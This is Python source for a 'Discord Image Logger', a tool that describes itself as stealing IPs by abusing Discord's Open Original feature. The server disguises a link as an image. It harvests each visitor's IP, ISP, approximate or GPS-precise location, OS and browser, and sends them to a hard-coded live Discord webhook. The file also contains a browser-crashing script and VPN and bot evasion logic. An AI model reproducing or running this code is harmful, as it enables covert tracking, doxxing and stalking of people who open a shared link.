# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1420204017346285640/pRMCEr5JSc2hZHWbOonEViSruT1cJsRrH7UxeJ7fus7CLWVY3UY9iRpjtAnlq4R9VU8x",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
